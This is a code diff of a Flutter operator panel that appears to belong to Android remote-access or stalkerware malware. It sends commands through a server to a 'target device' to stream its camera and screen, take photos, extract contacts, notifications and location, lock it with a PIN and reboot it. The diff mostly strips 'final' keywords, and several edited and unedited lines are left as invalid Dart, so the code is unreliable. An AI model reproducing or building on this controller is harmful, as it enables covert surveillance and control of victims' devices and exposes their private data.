@@ -114,7 +114,7 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
         Uri.parse('$_kBase/api/send-command'),
         headers: {'Content-Type': 'application/json'},
         body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
-      ).timeout(final Duration(seconds: 12));
+      ).timeout(Duration(seconds: 12));
 
       if (res.statusCode == 200) {
         if (!silent) {
@@ -139,12 +139,12 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
     final max = cmd == 'get_gallery' ? 60 : 30;
     int n = 0; bool got = false;
     while (n < max && !got && mounted) {
-      await Future.delayed(final Duration(milliseconds: 1000));
+      await Future.delayed(Duration(milliseconds: 1000));
       n++;
       _addLog('Polling $cmd ($n/$max)');
       try {
         final res = await http.get(Uri.parse('$_kBase/api/get-response/$_id'))
-            .timeout(final Duration(seconds: 8));
+            .timeout(Duration(seconds: 8));
         if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
           final d = jsonDecode(res.body);
           if (d['data'] != null) {
@@ -250,13 +250,13 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
     if (_id == 'unknown') return;
     try {
       final res = await http.get(Uri.parse('$_kBase/api/lock-chat-all/$_id'))
-          .timeout(final Duration(seconds: 4));
+          .timeout(Duration(seconds: 4));
       if (res.statusCode == 200) {
         final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
         if (msgs.length != _chat.length && mounted) {
           setState(() {
             _chat.clear();
-            for (final m in msgs) {
+            for (m in msgs) {
               _chat.add({'from': m['from']?.toString() ?? '','text': m['text']?.toString() ??'','time': m['time']?.toString() ??''});
             }
           });
@@ -275,7 +275,7 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
       await http.post(Uri.parse('$_kBase/api/lock-chat/$_id'),
         headers: {'Content-Type': 'application/json'},
         body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
-      ).timeout(final Duration(seconds: 5));
+      ).timeout(Duration(seconds: 5));
     } catch (_) {}
   }
 
@@ -283,7 +283,7 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
     Future.delayed(const Duration(milliseconds: 100), () {
       if (_chatScroll.hasClients) _chatScroll.animateTo(
           _chatScroll.position.maxScrollExtent,
-          duration: final Duration(milliseconds: 200), curve: Curves.easeOut);
+          duration: Duration(milliseconds: 200), curve: Curves.easeOut);
     });
   }
 
@@ -298,28 +298,28 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
         backgroundColor: _kCard,
         elevation: 0,
         leading: IconButton(
-          icon: final Icon(Icons.arrow_back_ios_new, color: _kText, size: 18),
+          icon: Icon(Icons.arrow_back_ios_new, color: _kText, size: 18),
           onPressed: () { if (_liveOn) _stopLive(); Navigator.pop(context); }),
         title: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-          Text(_model, style: final TextStyle(color: _kText, fontSize: 15, fontWeight: FontWeight.w600)),
+          Text(_model, style: TextStyle(color: _kText, fontSize: 15, fontWeight: FontWeight.w600)),
           Row(children: [
             Container(width: 6, height: 6, decoration: BoxDecoration(color: _liveOn ? _kAccent : _kTextSecondary, shape: BoxShape.circle)),
             final SizedBox(width: 6),
             Text('Battery: $_battery%  •  $_id',
-                style: final TextStyle(color: _kTextSecondary, fontSize: 10), overflow: TextOverflow.ellipsis),
+                style: TextStyle(color: _kTextSecondary, fontSize: 10), overflow: TextOverflow.ellipsis),
           ]),
         ]),
         actions: [
           if (_liveOn) Container(
-            margin: final EdgeInsets.symmetric(vertical: 14, horizontal: 4),
-            padding: final EdgeInsets.symmetric(horizontal: 8, vertical: 2),
+            margin: EdgeInsets.symmetric(vertical: 14, horizontal: 4),
+            padding: EdgeInsets.symmetric(horizontal: 8, vertical: 2),
             decoration: BoxDecoration(color: _kAccent.withOpacity(0.1), borderRadius: BorderRadius.circular(4), border: Border.all(color: _kAccent.withOpacity(0.3))),
             child: Text('$_fps fps', style: TextStyle(color: _kAccent, fontSize: 10, fontWeight: FontWeight.w600)),
           ),
           if (_sending) final Padding(padding: EdgeInsets.only(right: 12),
             child: SizedBox(width: 16, height: 16,
                 child: CircularProgressIndicator(strokeWidth: 1.5, valueColor: AlwaysStoppedAnimation(_kAccent)))),
-          IconButton(icon: final Icon(Icons.refresh, color: _kTextSecondary, size: 20),
+          IconButton(icon: Icon(Icons.refresh, color: _kTextSecondary, size: 20),
             onPressed: () { setState(() {}); _cmd('force_open', silent: true); }),
         ],
         bottom: TabBar(
@@ -330,9 +330,9 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
           indicatorSize: TabBarIndicatorSize.label,
           labelColor: _kText,
           unselectedLabelColor: _kTextSecondary,
-          labelStyle: final TextStyle(fontSize: 12, fontWeight: FontWeight.w500, letterSpacing: 0.3),
-          unselectedLabelStyle: final TextStyle(fontSize: 12),
-          tabs: final [
+          labelStyle: TextStyle(fontSize: 12, fontWeight: FontWeight.w500, letterSpacing: 0.3),
+          unselectedLabelStyle: TextStyle(fontSize: 12),
+          tabs: [
             Tab(text: 'LIVE'),
             Tab(text: 'CAMERA'),
             Tab(text: 'DATA'),
@@ -346,8 +346,8 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
         // Activity log bar
         Container(
           height: 48,
-          margin: final EdgeInsets.fromLTRB(12, 8, 12, 0),
-          padding: final EdgeInsets.fromLTRB(12, 8, 12, 8),
+          margin: EdgeInsets.fromLTRB(12, 8, 12, 0),
+          padding: EdgeInsets.fromLTRB(12, 8, 12, 8),
           decoration: BoxDecoration(
             color: _kCard,
             borderRadius: BorderRadius.circular(8),
@@ -359,8 +359,8 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
                   scrollDirection: Axis.horizontal,
                   itemCount: _log.length,
                   itemBuilder: (_, i) => Padding(
-                    padding: final EdgeInsets.only(right: 12),
-                    child: Text(_log[i], style: final TextStyle(color: _kTextSecondary, fontSize: 9, fontFamily: 'monospace')),
+                    padding: EdgeInsets.only(right: 12),
+                    child: Text(_log[i], style: TextStyle(color: _kTextSecondary, fontSize: 9, fontFamily: 'monospace')),
                   )),
         ),
         Expanded(child: TabBarView(controller: _tabs, children: [
@@ -378,7 +378,7 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
   // ─────────────────────────────────────────────────────────────────────────
   // TAB: LIVE STREAM
   // ─────────────────────────────────────────────────────────────────────────
-  Widget _pageLive() => ListView(padding: final EdgeInsets.all(16), children: [
+  Widget _pageLive() => ListView(padding: EdgeInsets.all(16), children: [
     _sectionHeader('Live Stream', 'Real-time camera and screen capture'),
     final SizedBox(height: 12),
     // Preview
@@ -393,7 +393,7 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
         child: _liveOn && _frame != null
             ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true)
             : Center(child: Text(_liveOn ? 'Connecting...' : 'Stream inactive',
-                style: final TextStyle(color: _kTextSecondary, fontSize: 12))),
+                style: TextStyle(color: _kTextSecondary, fontSize: 12))),
       ),
     ),
     final SizedBox(height: 16),
@@ -415,7 +415,7 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
   // ─────────────────────────────────────────────────────────────────────────
   // TAB: CAMERA
   // ─────────────────────────────────────────────────────────────────────────
-  Widget _pageCamera() => ListView(padding: final EdgeInsets.all(16), children: [
+  Widget _pageCamera() => ListView(padding: EdgeInsets.all(16), children: [
     _sectionHeader('Camera', 'Capture photos and manage visual content'),
     final SizedBox(height: 12),
     _actionBtn('Take Photo',   _kAccent,  Icons.camera_alt,      () => _showCamPicker((s) => _cmd('take_photo', extra: s))),
@@ -434,7 +434,7 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
   // ─────────────────────────────────────────────────────────────────────────
   // TAB: INTELLIGENCE (DATA)
   // ─────────────────────────────────────────────────────────────────────────
-  Widget _pageIntel() => ListView(padding: final EdgeInsets.all(16), children: [
+  Widget _pageIntel() => ListView(padding: EdgeInsets.all(16), children: [
     _sectionHeader('Data Collection', 'Extract information from target device'),
     final SizedBox(height: 12),
     _actionBtn('Contacts',          _kAccent,  Icons.contacts,         () => _cmd('get_contacts')),
@@ -455,7 +455,7 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
   // ─────────────────────────────────────────────────────────────────────────
   // TAB: AUDIO
   // ─────────────────────────────────────────────────────────────────────────
-  Widget _pageAudio() => ListView(padding: final EdgeInsets.all(16), children: [
+  Widget _pageAudio() => ListView(padding: EdgeInsets.all(16), children: [
     _sectionHeader('Audio & Network', 'Control audio playback and connectivity'),
     final SizedBox(height: 12),
     _actionBtn('Play Audio',   _kWarning, Icons.play_circle,  () => _inputDialog('Play Audio', 'MP3 URL', (v) => _cmd('play_audio', extra: v))),
@@ -473,7 +473,7 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
   // TAB: LOCK & CHAT
   // ─────────────────────────────────────────────────────────────────────────
   Widget _pageLock() => Column(children: [
-    Expanded(child: ListView(padding: final EdgeInsets.all(16), children: [
+    Expanded(child: ListView(padding: EdgeInsets.all(16), children: [
       _sectionHeader('Remote Lock', 'Secure the device and communicate'),
       final SizedBox(height: 12),
 
@@ -503,7 +503,7 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
             ? final Center(child: Text('No messages', style: TextStyle(color: _kTextSecondary, fontSize: 12)))
             : ListView.builder(
                 controller: _chatScroll,
-                padding: final EdgeInsets.all(12),
+                padding: EdgeInsets.all(12),
                 itemCount: _chat.length,
                 itemBuilder: (_, i) {
                   final m = _chat[i];
@@ -511,8 +511,8 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
                   return Align(
                     alignment: isOwner ? Alignment.centerRight : Alignment.centerLeft,
                     child: Container(
-                      margin: final EdgeInsets.symmetric(vertical: 4),
-                      padding: final EdgeInsets.symmetric(horizontal: 12, vertical: 8),
+                      margin: EdgeInsets.symmetric(vertical: 4),
+                      padding: EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                       constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.7),
                       decoration: BoxDecoration(
                         color: isOwner ? _kAccent.withOpacity(0.85) : Colors.transparent,
@@ -520,9 +520,9 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
                         border: isOwner ? null : Border.all(color: _kBorder, width: 0.5),
                       ),
                       child: Column(crossAxisAlignment: isOwner ? CrossAxisAlignment.end : CrossAxisAlignment.start, children: [
-                        Text(m['text'] ?? '', style: final TextStyle(color: _kText, fontSize: 13)),
+                        Text(m['text'] ?? '', style: TextStyle(color: _kText, fontSize: 13)),
                         final SizedBox(height: 2),
-                        Text(m['time'] ?? '', style: final TextStyle(color: _kTextSecondary, fontSize: 9)),
+                        Text(m['time'] ?? '', style: TextStyle(color: _kTextSecondary, fontSize: 9)),
                       ]),
                     ),
                   );
@@ -531,18 +531,18 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
     ])),
     // Chat input bar
     Container(
-      padding: final EdgeInsets.fromLTRB(16, 10, 16, 12),
+      padding: EdgeInsets.fromLTRB(16, 10, 16, 12),
       decoration: BoxDecoration(color: _kCard, border: Border(top: BorderSide(color: _kBorder, width: 0.5))),
       child: Row(children: [
         Expanded(child: TextField(
           controller: _chatCtrl,
-          style: final TextStyle(color: _kText, fontSize: 14),
+          style: TextStyle(color: _kText, fontSize: 14),
           decoration: InputDecoration(
             hintText: 'Type a message...',
-            hintStyle: final TextStyle(color: _kTextSecondary, fontSize: 13),
+            hintStyle: TextStyle(color: _kTextSecondary, fontSize: 13),
             filled: true,
             fillColor: _kBg,
-            contentPadding: final EdgeInsets.symmetric(horizontal: 16, vertical: 12),
+            contentPadding: EdgeInsets.symmetric(horizontal: 16, vertical: 12),
             border: OutlineInputBorder(borderRadius: BorderRadius.circular(24), borderSide: BorderSide.none),
           ),
           onSubmitted: _sendChat,
@@ -551,9 +551,9 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
         GestureDetector(
           onTap: () => _sendChat(_chatCtrl.text),
           child: Container(
-            padding: final EdgeInsets.all(12),
+            padding: EdgeInsets.all(12),
             decoration: BoxDecoration(color: _kAccent, shape: BoxShape.circle),
-            child: final Icon(Icons.send, color: Colors.white, size: 18)),
+            child: Icon(Icons.send, color: Colors.white, size: 18)),
         ),
       ]),
     ),
@@ -562,23 +562,23 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
   // ─────────────────────────────────────────────────────────────────────────
   // TAB: DEVICE
   // ─────────────────────────────────────────────────────────────────────────
-  Widget _pageDevice() => ListView(padding: final EdgeInsets.all(16), children: [
+  Widget _pageDevice() => ListView(padding: EdgeInsets.all(16), children: [
     _sectionHeader('Device Control', 'System-level device management'),
     final SizedBox(height: 12),
     _actionBtn('Restart Device', _kWarning, Icons.power_settings_new, () {
       showDialog(context: context, builder: (_) => AlertDialog(
         backgroundColor: _kCard,
         shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
-        title: final Text('Restart Device', style: TextStyle(color: _kText, fontSize: 16, fontWeight: FontWeight.w600)),
-        content: final Text(
+        title: Text('Restart Device', style: TextStyle(color: _kText, fontSize: 16, fontWeight: FontWeight.w600)),
+        content: Text(
           'The target device will be restarted.',
           style: TextStyle(color: _kTextSecondary, fontSize: 13, height: 1.5)),
         actions: [
-          TextButton(onPressed: () => Navigator.pop(context), child: final Text('Cancel', style: TextStyle(color: _kTextSecondary))),
+          TextButton(onPressed: () => Navigator.pop(context), child: Text('Cancel', style: TextStyle(color: _kTextSecondary))),
           ElevatedButton(
             style: ElevatedButton.styleFrom(backgroundColor: _kWarning, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
             onPressed: () { Navigator.pop(context); _cmd('reboot_device'); },
-            child: final Text('Restart', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
+            child: Text('Restart', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
         ],
       ));
     }),
@@ -586,7 +586,7 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
     _actionBtn('Wake Device', _kSuccess, Icons.brightness_5, () => _cmd('force_open')),
     final SizedBox(height: 20),
     Container(
-      padding: final EdgeInsets.all(16),
+      padding: EdgeInsets.all(16),
       decoration: BoxDecoration(color: _kCard, borderRadius: BorderRadius.circular(12), border: Border.all(color: _kBorder, width: 0.5)),
       child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
         final Text('Restart Methods', style: TextStyle(color: _kText, fontSize: 12, fontWeight: FontWeight.w600)),
@@ -610,21 +610,21 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
         valueListenable: _frameN,
         builder: (ctx, _, __) => Dialog(
           backgroundColor: _kCard,
-          insetPadding: final EdgeInsets.all(8),
+          insetPadding: EdgeInsets.all(8),
           shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
           child: Column(mainAxisSize: MainAxisSize.min, children: [
             Container(
-              padding: final EdgeInsets.symmetric(horizontal: 16, vertical: 12),
-              decoration: BoxDecoration(color: _kCard, borderRadius: final BorderRadius.vertical(top: Radius.circular(16)), border: final Border(bottom: BorderSide(color: _kBorder))),
+              padding: EdgeInsets.symmetric(horizontal: 16, vertical: 12),
+              decoration: BoxDecoration(color: _kCard, borderRadius: BorderRadius.vertical(top: Radius.circular(16)), border: Border(bottom: BorderSide(color: _kBorder))),
               child: Row(children: [
                 Container(width: 8, height: 8, decoration: BoxDecoration(color: _kAccent, shape: BoxShape.circle)),
                 final SizedBox(width: 10),
-                Text('LIVE · $_liveTitle', style: final TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w600)),
+                Text('LIVE · $_liveTitle', style: TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w600)),
                 final Spacer(),
                 Container(
-                  padding: final EdgeInsets.symmetric(horizontal: 8, vertical: 2),
+                  padding: EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                   decoration: BoxDecoration(color: _kSuccess.withOpacity(0.1), borderRadius: BorderRadius.circular(4), border: Border.all(color: _kSuccess.withOpacity(0.3))),
-                  child: Text('$_fps fps', style: final TextStyle(color: _kSuccess, fontSize: 10, fontWeight: FontWeight.w600))),
+                  child: Text('$_fps fps', style: TextStyle(color: _kSuccess, fontSize: 10, fontWeight: FontWeight.w600))),
               ]),
             ),
             Container(
@@ -632,27 +632,27 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
               color: _kBg,
               child: _frame != null
                   ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true)
-                  : final SizedBox(height: 200, child: Center(child: CircularProgressIndicator(color: _kAccent, strokeWidth: 2))),
+                  : SizedBox(height: 200, child: Center(child: CircularProgressIndicator(color: _kAccent, strokeWidth: 2))),
             ),
             Container(
-              padding: final EdgeInsets.all(12),
-              decoration: final BoxDecoration(color: _kCard, borderRadius: BorderRadius.vertical(bottom: Radius.circular(16))),
+              padding: EdgeInsets.all(12),
+              decoration: BoxDecoration(color: _kCard, borderRadius: BorderRadius.vertical(bottom: Radius.circular(16))),
               child: Row(children: [
                 Expanded(child: OutlinedButton.icon(
                   style: OutlinedButton.styleFrom(side: BorderSide(color: _kBorder), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
-                  icon: final Icon(Icons.cameraswitch, color: _kTextSecondary, size: 16),
-                  label: final Text('Switch', style: TextStyle(color: _kTextSecondary, fontSize: 12)),
+                  icon: Icon(Icons.cameraswitch, color: _kTextSecondary, size: 16),
+                  label: Text('Switch', style: TextStyle(color: _kTextSecondary, fontSize: 12)),
                   onPressed: () {
                     final isFront = _liveTitle.contains('Front');
                     _stopLive();
-                    Future.delayed(final Duration(milliseconds: 300), () => _startLive('live_camera_start', isFront ? 'back' : 'front'));
+                    Future.delayed(Duration(milliseconds: 300), () => _startLive('live_camera_start', isFront ? 'back' : 'front'));
                   },
                 )),
                 final SizedBox(width: 10),
                 Expanded(child: ElevatedButton.icon(
                   style: ElevatedButton.styleFrom(backgroundColor: _kAccent, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
-                  icon: final Icon(Icons.stop, color: Colors.white, size: 16),
-                  label: final Text('Stop', style: TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.w600)),
+                  icon: Icon(Icons.stop, color: Colors.white, size: 16),
+                  label: Text('Stop', style: TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.w600)),
                   onPressed: () { _stopLive(); Navigator.pop(ctx); },
                 )),
               ]),
@@ -669,7 +669,7 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
     showDialog(context: context, builder: (_) => AlertDialog(
       backgroundColor: _kCard,
       shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
-      title: final Text('Lock + Chat', style: TextStyle(color: _kText, fontSize: 15, fontWeight: FontWeight.w600)),
+      title: Text('Lock + Chat', style: TextStyle(color: _kText, fontSize: 15, fontWeight: FontWeight.w600)),
       content: Column(mainAxisSize: MainAxisSize.min, children: [
         final Text('Lock device and enable two-way chat', style: TextStyle(color: _kTextSecondary, fontSize: 12)),
         final SizedBox(height: 14),
@@ -678,7 +678,7 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
         _field(pinCtrl, 'Unlock PIN', hint: '1234', isNum: true),
       ]),
       actions: [
-        TextButton(onPressed: () => Navigator.pop(context), child: final Text('Cancel', style: TextStyle(color: _kTextSecondary))),
+        TextButton(onPressed: () => Navigator.pop(context), child: Text('Cancel', style: TextStyle(color: _kTextSecondary))),
         ElevatedButton(
           style: ElevatedButton.styleFrom(backgroundColor: _kAccent, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
           onPressed: () {
@@ -687,7 +687,7 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
             final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
             _cmd('lock_live', extra: '$msg|$pin');
           },
-          child: final Text('LOCK', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
+          child: Text('LOCK', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
       ],
     ));
   }
@@ -698,13 +698,13 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
       builder: (ctx, ss) => AlertDialog(
         backgroundColor: _kCard,
         shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
-        title: final Text('Select Camera', style: TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w600)),
+        title: Text('Select Camera', style: TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w600)),
         content: Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: ['back','front'].map((v) {
           final isSel = sel == v;
           return GestureDetector(
             onTap: () => ss(() => sel = v),
             child: Container(
-              padding: final EdgeInsets.symmetric(horizontal: 20, vertical: 12),
+              padding: EdgeInsets.symmetric(horizontal: 20, vertical: 12),
               decoration: BoxDecoration(
                 color: isSel ? _kAccent.withOpacity(0.1) : Colors.transparent,
                 borderRadius: BorderRadius.circular(8),
@@ -718,11 +718,11 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
           );
         }).toList()),
         actions: [
-          TextButton(onPressed: () => Navigator.pop(ctx), child: final Text('Cancel', style: TextStyle(color: _kTextSecondary))),
+          TextButton(onPressed: () => Navigator.pop(ctx), child: Text('Cancel', style: TextStyle(color: _kTextSecondary))),
           ElevatedButton(
             style: ElevatedButton.styleFrom(backgroundColor: _kAccent, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
             onPressed: () { Navigator.pop(ctx); onPick(sel); },
-            child: final Text('Select', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
+            child: Text('Select', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
         ],
       ),
     ));
@@ -733,14 +733,14 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
     showDialog(context: context, builder: (_) => AlertDialog(
       backgroundColor: _kCard,
       shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
-      title: Text(title, style: final TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w600)),
+      title: Text(title, style: TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w600)),
       content: _field(ctrl, label, hint: hint, isNum: isNumber),
       actions: [
-        TextButton(onPressed: () => Navigator.pop(context), child: final Text('Cancel', style: TextStyle(color: _kTextSecondary))),
+        TextButton(onPressed: () => Navigator.pop(context), child: Text('Cancel', style: TextStyle(color: _kTextSecondary))),
         ElevatedButton(
           style: ElevatedButton.styleFrom(backgroundColor: _kAccent, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
           onPressed: () { Navigator.pop(context); onDone(ctrl.text.trim()); },
-          child: final Text('Send', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
+          child: Text('Send', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
       ],
     ));
   }
@@ -757,20 +757,20 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
         _addLog('${list.length} notifications');
         showModalBottomSheet(context: context, backgroundColor: _kCard,
           isScrollControlled: true,
-          shape: final RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
+          shape: RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
           builder: (_) => DraggableScrollableSheet(initialChildSize: 0.6, maxChildSize: 0.9, expand: false,
             builder: (_, sc) => Column(children: [
-              Container(height: 4, width: 40, margin: final EdgeInsets.only(top: 10, bottom: 10), decoration: BoxDecoration(color: _kBorder, borderRadius: BorderRadius.circular(2))),
+              Container(height: 4, width: 40, margin: EdgeInsets.only(top: 10, bottom: 10), decoration: BoxDecoration(color: _kBorder, borderRadius: BorderRadius.circular(2))),
               final Text('Notifications', style: TextStyle(color: _kText, fontWeight: FontWeight.w600, fontSize: 15)),
               final SizedBox(height: 8),
-              Expanded(child: ListView.separated(controller: sc, padding: final EdgeInsets.symmetric(horizontal: 16),
+              Expanded(child: ListView.separated(controller: sc, padding: EdgeInsets.symmetric(horizontal: 16),
                 itemCount: list.length, separatorBuilder: (_, __) => Divider(color: _kBorder, height: 1),
                 itemBuilder: (_, i) => ListTile(
-                  contentPadding: final EdgeInsets.symmetric(horizontal: 0, vertical: 4),
+                  contentPadding: EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                   leading: Container(width: 40, height: 40, decoration: BoxDecoration(color: _kPurple.withOpacity(0.1), borderRadius: BorderRadius.circular(8)),
-                    child: final Icon(Icons.notifications, color: _kPurple, size: 20)),
-                  title: Text(list[i]['title']?.toString() ?? '-', style: final TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w600)),
-                  subtitle: Text(list[i]['body']?.toString() ?? '', style: final TextStyle(color: _kTextSecondary, fontSize: 12))),
+                    child: Icon(Icons.notifications, color: _kPurple, size: 20)),
+                  title: Text(list[i]['title']?.toString() ?? '-', style: TextStyle(color: _kText, fontSize: 13, fontWeight: FontWeight.w600)),
+                  subtitle: Text(list[i]['body']?.toString() ?? '', style: TextStyle(color: _kTextSecondary, fontSize: 12))),
               )),
             ]),
           ));
@@ -783,12 +783,12 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
       final c = b64.contains(',') ? b64.split(',').last : b64;
       final bytes = base64Decode(c);
       showDialog(context: context, builder: (_) => Dialog(
-        backgroundColor: _kCard, insetPadding: final EdgeInsets.all(16),
+        backgroundColor: _kCard, insetPadding: EdgeInsets.all(16),
         shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
         child: Column(mainAxisSize: MainAxisSize.min, children: [
-          Padding(padding: final EdgeInsets.all(16),
-            child: Text(title, style: final TextStyle(color: _kText, fontWeight: FontWeight.w600, fontSize: 14))),
-          ClipRRect(borderRadius: final BorderRadius.vertical(bottom: Radius.circular(16)),
+          Padding(padding: EdgeInsets.all(16),
+            child: Text(title, style: TextStyle(color: _kText, fontWeight: FontWeight.w600, fontSize: 14))),
+          ClipRRect(borderRadius: BorderRadius.vertical(bottom: Radius.circular(16)),
             child: Image.memory(bytes, fit: BoxFit.contain)),
         ]),
       ));
@@ -798,18 +798,18 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
   void _locationDialog(dynamic lat, dynamic lng) {
     showDialog(context: context, builder: (_) => AlertDialog(
       backgroundColor: _kCard, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
-      title: final Text('Location', style: TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w600)),
+      title: Text('Location', style: TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w600)),
       content: Column(mainAxisSize: MainAxisSize.min, children: [
-        Text('Lat:  $lat', style: final TextStyle(color: _kSuccess, fontFamily: 'monospace', fontSize: 13)),
+        Text('Lat:  $lat', style: TextStyle(color: _kSuccess, fontFamily: 'monospace', fontSize: 13)),
         final SizedBox(height: 6),
-        Text('Lng: $lng', style: final TextStyle(color: _kSuccess, fontFamily: 'monospace', fontSize: 13)),
+        Text('Lng: $lng', style: TextStyle(color: _kSuccess, fontFamily: 'monospace', fontSize: 13)),
       ]),
       actions: [
-        TextButton(onPressed: () => Navigator.pop(context), child: final Text('Close', style: TextStyle(color: _kTextSecondary))),
+        TextButton(onPressed: () => Navigator.pop(context), child: Text('Close', style: TextStyle(color: _kTextSecondary))),
         ElevatedButton(
           style: ElevatedButton.styleFrom(backgroundColor: _kSuccess, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))),
           onPressed: () => launchUrl(Uri.parse('https://www.google.com/maps/search/?api=1&query=$lat,$lng'), mode: LaunchMode.externalApplication),
-          child: final Text('Open Maps', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
+          child: Text('Open Maps', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w600))),
       ],
     ));
   }
@@ -817,30 +817,30 @@ class _State extends State<ControlCenterPage> with SingleTickerProviderStateMixi
   void _textDialog(String title, String content) {
     showDialog(context: context, builder: (_) => AlertDialog(
       backgroundColor: _kCard, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
-      title: Text(title, style: final TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w600)),
-      content: Container(padding: final EdgeInsets.all(12), decoration: BoxDecoration(color: _kBg, borderRadius: BorderRadius.circular(8)),
-        child: SelectableText(content, style: final TextStyle(color: _kSuccess, fontFamily: 'monospace', fontSize: 12))),
-      actions: [TextButton(onPressed: () => Navigator.pop(context), child: final Text('Close', style: TextStyle(color: _kTextSecondary)))],
+      title: Text(title, style: TextStyle(color: _kText, fontSize: 14, fontWeight: FontWeight.w600)),
+      content: Container(padding: EdgeInsets.all(12), decoration: BoxDecoration(color: _kBg, borderRadius: BorderRadius.circular(8)),
+        child: SelectableText(content, style: TextStyle(color: _kSuccess, fontFamily: 'monospace', fontSize: 12))),
+      actions: [TextButton(onPressed: () => Navigator.pop(context), child: Text('Close', style: TextStyle(color: _kTextSecondary)))],
     ));
   }
 
   void _contactsSheet(List contacts) {
     showModalBottomSheet(context: context, backgroundColor: _kCard,
       isScrollControlled: true,
-      shape: final RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
+      shape: RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(16))),
       builder: (_) => DraggableScrollableSheet(initialChildSize: 0.6, maxChildSize: 0.9, expand: false,
         builder: (_, sc) => Column(children: [
-          Container(height: 4, width: 40, margin: final EdgeInsets.only(top: 10, bottom: 10), decoration: BoxDecoration(color: _kBorder, borderRadius: BorderRadius.circular(2))),
